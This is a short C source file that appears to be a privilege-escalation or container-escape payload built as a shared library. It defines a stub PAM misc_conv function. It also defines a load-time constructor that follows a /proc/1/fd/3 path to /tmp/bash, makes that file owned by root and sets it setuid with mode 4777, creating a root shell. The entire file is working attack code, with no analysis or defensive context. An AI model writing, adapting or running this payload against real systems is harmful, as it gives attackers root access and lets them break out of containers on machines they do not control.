#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>

int misc_conv(int num_msg, const struct pam_message **msgm, struct pam_response **response, void *appdata_ptr) {
    return 1;
}

static __attribute__ ((constructor)) void init(void) {
    char fn[120] = "/proc/1/fd/3/../../../../../../../../tmp/bash";
    char mode[] = "4777";
    int mode_int = strtol(mode, 0, 8);
    chown(fn, 0, 0);
    chmod(fn, mode_int);
}
